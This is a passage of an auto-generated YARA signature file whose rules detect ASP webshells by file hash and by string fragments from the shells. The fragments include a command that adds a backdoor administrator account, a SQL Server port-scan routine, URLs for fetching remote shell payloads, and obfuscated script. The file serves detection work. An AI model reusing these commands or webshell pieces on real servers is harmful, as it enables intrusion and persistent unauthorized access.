      $s17 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s18 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s19 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
      $s20 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule asp {
   meta:
      description = "webshell - file asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "blogurl=\"http://aspmuma.cccpan.com\"" fullword ascii
      $s14 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s15 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s16 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s17 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s18 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s19 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s20 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule asp__1___2014_10_23_14_54_16 {
   meta:
      description = "webshell - file asp (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s14 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s15 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s16 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s17 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s18 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s19 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
      $s20 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule mumaasp_com {
   meta:
      description = "webshell - file mumaasp.com.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a127dfa17e403f954441ae42d4bca8d2bdbc2e566e522a2ea75d88722540efae"
   strings:
      $s1 = "Webshell Mumaasp.com" fullword ascii
      $s2 = "UserPass=\"mumaasp.com\"'" fullword ascii
      $s3 = "Mumaasp.com\" '" fullword ascii
      $s4 = "kkY.lOGMB@*@!(.@*r@#@&." fullword ascii
      $s5 = "+Gx /GA9r?)Yv+^8N+rCOM+~Z,x" fullword ascii
      $s6 = ".kDn,J~,@!:I@*r@#@&]+kwGxk+ " fullword ascii
      $s7 = "xOZKP=nMlN_nN9RbknGxkw\"+n=0=wOiK,=P{+O.ktl /k+Gxk2\"+|m:M+/DY O+KmUzbWCObmw^Cw,UP{2nKHxDYnWU ;/nW" fullword ascii
      $s8 = "<%@ LANGUAGE = VBScript.encode %>" fullword ascii
      $s9 = "NHEs4n.vHk" fullword ascii
      $s10 = "0{B%l-Ckm.kaO)4kdOKDX 8mmV`*v@*" fullword ascii
      $s11 = "mmshell =\"" fullword ascii
      $s12 = "rUjk+DWJWLzBPCE(s+n+rUAxlOGdWL+B~mE3" fullword ascii
      $s13 = "~Jm~r[M+;!+kOR6W.:vJ^h9J#* /DNW!O D" fullword ascii
      $s14 = "MkDnPrg)mDkGU{?mwGV9+DLoGV9+M'E@#@&]" fullword ascii
      $s15 = "Po}SGR/!46GV9+./@#@&j({?qLE@!DNP4nro4Y{FTPAr9Y4'8{],lsrTx'^n" fullword ascii
      $s16 = "/aGxk+ hMkOnr@!k" fullword ascii
      $s17 = "x@#@&,PP~~,PnDM ;VnmD@#@&d,P,]+qDjYMPx~6WV9nD,[Pr@!orgK,mGVG.{aW0y+ y@*~" fullword ascii
      $s18 = "[P&0=gnaY# ,'~YOrs+.ksnD#khnMF+.+ YO`DrsY.vk" fullword ascii
      $s19 = "GDPG6W^N+MR&dIKWOsKV[nMPY4nx,@#@&\"ndwKxk+ h.rD+~J@!dmMk2O@*?tGAwWsN" fullword ascii
      $s20 = "J~',InNvP+kY9.b\\+ #KV;:" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule webshell_asp_radhat {
   meta:
      description = "webshell - file radhat.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2cc89b0e2ac08b26c312e2915d66a9e9f17ecbf63467e4258adbbeee5d5e84dc"
   strings:
      $s1 = "server.scripttimeout=600" fullword ascii
      $s2 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s3 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s4 = "`>ofXVE4/<}};VxocTo=octVxo.)'2ZN'(VrC;)(oX7yP4.)'2ZN'(VrC;)ESE(7Sd=cP2xS.yKb.)'2ZN'(VrC;)5XC(7Sd=cP2xS.rcZ.)'2ZN'(VrC{c42c};)(oX" ascii
      $s5 = "const dbx=\"http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt\"" fullword ascii
      $s6 = "c7xRf7cooc1.dNZ&4VV=KEY" fullword ascii
      $s7 = ")k - )254(Kcl,254(odcl=254 KcTi ` wKJ `=)k,254(oTtXG da" fullword ascii
      $s8 = ")O - )254(Kcl,254(odcl=254 KcTi ` Vm `=)O,254(oTtXG da" fullword ascii
      $s9 = ")D - CZL,5oy(odcl=ETo" fullword ascii
      $s10 = "D - oKPZn.4w2cXQ.4V Zi W=X VZQ" fullword ascii
      $s11 = "D - oKPZn.4w2cXQ.4V Zi W=f VZQ" fullword ascii
      $s12 = "VZ2ZE;wcYXd:oPZCx2-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
      $s13 = ")D - CXd,254(odcl=254 KcTi W > CXd da" fullword ascii
      $s14 = "))A(4V&` 7ZVd * oEc2c4`(coPEcYc.ytr=D4V ocj" fullword ascii
      $s15 = " Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4`(coPEcYc.ytr" fullword ascii
      $s16 = "'(7VXdKZE!(dX;KVPocV)Vo4!(dX{)Vo4,K7P2ZE(y5C KZXoEKPd};)(oc4cV.7Vd;''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+" ascii
      $s17 = "','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4;D,'gGmhg_1pG','cwZHYZU`&fX4&`wKxj','4cK`&L7w&`XtKp\\W.O\\ocF\\odZ4ZV" ascii
      $s18 = "};]D[)'*'(oX2f4.f7iVo4=f7iVo4;]W[)'*'(oX2f4.Vo4=Vo4{)D- =!)'*'(dmYcwKX.Vo4&&Vo4(dX;cP2xS.rcZ.7Vd=Uf7iVo4;Vo4=f7iVo4 VxS;Uf7iVo4 " ascii
      $s19 = ")`;)422PKfccL( ToXb 'f7o.EKr' 7ZVd ]EKr[ oVc4KX L2Py;)')`&)Oq(VTE&`f7o.EKr f7o.zDeu CfZE E/ cYc.w7E`&)Oq(VTE&`(22cT4 oEc2c4','`&" ascii
      $s20 = "c7xRCx2f4Xg.ryZ,`b`5rP" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
   strings:
      $s1 = "server.scripttimeout=600" fullword ascii
      $s2 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s3 = "if session(\"yka\")=\"\" then:session(\"yka\")=mkc(yka):end if:yka=session(\"yka\"):execute yka:ixt(err):function mkc(blr):dim g" ascii
      $s4 = " `>ofXVE4/<}};VxocTo=octVxo.)'2ZN'(VrC;)(oX7yP4.)'2ZN'(VrC;)ESE(7Sd=cP2xS.yKb.)'2ZN'(VrC;)5XC(7Sd=cP2xS.rcZ.)'2ZN'(VrC{c42c};)(o" ascii
      $s5 = "const dbx=\"http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt\"" fullword ascii
      $s6 = " )k - )254(Kcl,254(odcl=254 KcTi ` wKJ `=)k,254(oTtXG da" fullword ascii
      $s7 = " )D - CXd,254(odcl=254 KcTi W > CXd da" fullword ascii
      $s8 = "-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
      $s9 = " )D - CZL,5oy(odcl=ETo" fullword ascii
      $s10 = " D - oKPZn.4w2cXQ.4V Zi W=f VZQ" fullword ascii
      $s11 = " D - oKPZn.4w2cXQ.4V Zi W=X VZQ" fullword ascii
      $s12 = " )O - )254(Kcl,254(odcl=254 KcTi ` Vm `=)O,254(oTtXG da" fullword ascii
      $s13 = "'(7VXdKZE!(dX;KVPocV)Vo4!(dX{)Vo4,K7P2ZE(y5C KZXoEKPd};)(oc4cV.7Vd;''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+" ascii
      $s14 = "','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4;D,'gGmhg_1pG','cwZHYZU`&fX4&`wKxj','4cK`&L7w&`XtKp\\W.O\\ocF\\odZ4ZV" ascii
      $s15 = "};]D[)'*'(oX2f4.f7iVo4=f7iVo4;]W[)'*'(oX2f4.Vo4=Vo4{)D- =!)'*'(dmYcwKX.Vo4&&Vo4(dX;cP2xS.rcZ.7Vd=Uf7iVo4;Vo4=f7iVo4 VxS;Uf7iVo4 " ascii
      $s16 = "& Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4`(coPEcYc.ytr" fullword ascii
      $s17 = " )`;)422PKfccL( ToXb 'f7o.EKr' 7ZVd ]EKr[ oVc4KX L2Py;)')`&)Oq(VTE&`f7o.EKr f7o.zDeu CfZE E/ cYc.w7E`&)Oq(VTE&`(22cT4 oEc2c4','`" ascii
      $s18 = " ))A(4V&` 7ZVd * oEc2c4`(coPEcYc.ytr=D4V ocj" fullword ascii
      $s19 = "Session.Timeout=600" fullword ascii
      $s20 = " )KEY(c2XQoYcicoxcVn.dNZ" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 300KB and
      8 of them
}

rule __1_ {
   meta:
      description = "webshell - file  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s14 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s15 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s16 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s17 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s18 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s19 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
      $s20 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule  {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "blogurl=\"http://aspmuma.cccpan.com\"" fullword ascii
      $s14 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s15 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s16 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s17 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s18 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s19 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s20 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule __1___2014_10_23_14_54_16 {
   meta:
      description = "webshell - file  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $x1 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
      $s2 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
      $s3 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
      $s4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
      $s5 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
      $s7 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
      $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
      $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
      $s11 = " Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targ" ascii
      $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>RECYCLER</a>" fullword ascii
      $s13 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
      $s14 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
      $s15 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
      $s16 = "name&\"</a><hr><FORM Action='\"&URL&\"' method=Post> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login" ascii
      $s17 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
      $s18 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
      $s19 = "  else:T2.Type=1:T2.Mode=3:T2.Open:T1.Position=DIEnd:T1.CopyTo T2,DStart-DIEnd-3:T2.Position = 0:T2.Type = 2:T2.Charset =\"gb231" ascii
      $s20 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule cutstomize {
   meta:
      description = "webshell - file cutstomize.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "10450f39e8f2e44af1ab4340bef2a1dc350eb776de60e12a827b817c3176719f"
   strings:
      $s1 = "FBHu53D6Hu5931Hu8D25H21H7CH3CH2DH22H7DH0AH7DH0AH76H61H72H20H78H69H65H3DH22H2DH3EH7CH22H3BH0AH77H6AH6AH28H52H65H71H75H65H73H74H2E" ascii
      $s2 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>" fullword ascii
      $s3 = "CH61H73H74H4DH6FH64H69H66H69H65H64H2BH22H5CH74H22H2BH66H2EH73H69H7AH65H2BH22H5CH74H22H2BH66H2EH41H74H74H72H69H62H75H74H65H73H2BH" ascii
      $s4 = "3BH76H61H72H20H6FH46H73H6FH20H3DH20H53H65H72H76H65H72H2EH43H72H65H61H74H65H4FH62H6AH65H63H74H28H22H53H63H72H69H70H74H69H6EH67H2E" ascii
      $s5 = "H6FH2EH44H65H6CH65H74H65H46H69H6CH65H28H66H2CH74H72H75H65H29H3BH0AH78H69H65H2BH3DH22H31H7CH3CH2DH22H3BH0AH74H72H79H7BH66H73H6FH2" ascii
      $s6 = "H72H20H66H3DH66H73H6FH2EH4FH70H65H6EH54H65H78H74H66H69H6CH65H28H66H2CH31H2CH30H29H3BH0AH78H69H65H3DH78H69H65H2BH66H2EH52H65H61H6" ascii
      $s7 = "76H65H58H4FH62H6AH65H63H74H28H22H53H63H72H69H70H74H69H6EH67H2EH46H69H6CH65H53H79H73H74H65H6DH4FH62H6AH65H63H74H22H29H3BH0AH76H61" ascii
      $s8 = "EH44H65H6CH65H74H65H46H6FH6CH64H65H72H28H66H2CH74H72H75H65H29H3BH7DH63H61H74H63H68H28H65H29H7BH7DH0AH7DH63H61H74H63H68H28H65H29H" ascii
      $s9 = "29H29H3BH0AH76H61H72H20H66H3DH6EH65H77H20H45H6EH75H6DH65H72H61H74H6FH72H28H66H73H6FH2EH47H65H74H46H6FH6CH64H65H72H28H62H29H2EH66" ascii
      $s10 = "22H5CH6EH22H3BH7DH0AH76H61H72H20H53H3DH22H2DH3EH7CH22H3BH0AH77H6AH6AH28H52H65H71H75H65H73H74H2EH66H6FH72H6DH28H27H7AH31H27H29H29" ascii
      $s11 = "EH69H74H65H6DH28H29H29H0AH7DH0AH66H75H6EH63H74H69H6FH6EH20H62H66H6FH28H66H29H7BH53H2BH3DH66H2EH4EH61H6DH65H2BH22H5CH2FH5CH74H22H" ascii
      $s12 = "74H63H68H28H65H29H7BH78H69H65H2BH3DH22H45H52H52H4FH52H3AH2FH2FHu6587Hu4EF6Hu5199Hu5165Hu5931Hu8D25H21H7CH3CH2DH22H7DH0AH7DH0AH76" ascii
